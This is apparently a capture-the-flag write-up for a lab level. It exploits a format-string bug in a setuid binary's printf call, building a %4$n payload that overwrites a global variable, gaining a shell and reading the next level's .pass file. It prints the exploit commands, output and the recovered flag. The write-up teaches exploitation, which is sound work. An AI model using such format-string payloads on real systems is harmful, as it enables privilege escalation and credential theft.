# level3

```sh
$> ls -l ~
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

In the code, we can see that `printf(str)` is vulnerable, because we can inject anything into the `str` parameter.

```sh
$> python -c 'print("A"*4 + "%p %p %p %p")' | ./level3
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```

As we can see, the 4th pointer displayed is injectable.  
In gdb, we can see that there's an `m` variable which is compared to the value `64`.  
`printf` has a special `n` specifier that can write things in memory.  
To write the payload, we get the address of `m` and reverse it. Then, we write 60 bytes of random data, followed by `%4$n` which will write the value `64` to the 4th memory location.

```sh
$> gdb -q level3
(gdb) info variables
[...]
0x0804988c  m

$> python -c 'print("\x8c\x98\x04\x08" + "\x90"*60 + "%4$n")' > /tmp/payload

$> cat /tmp/payload - | ./level3
????????????????????????????????????
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
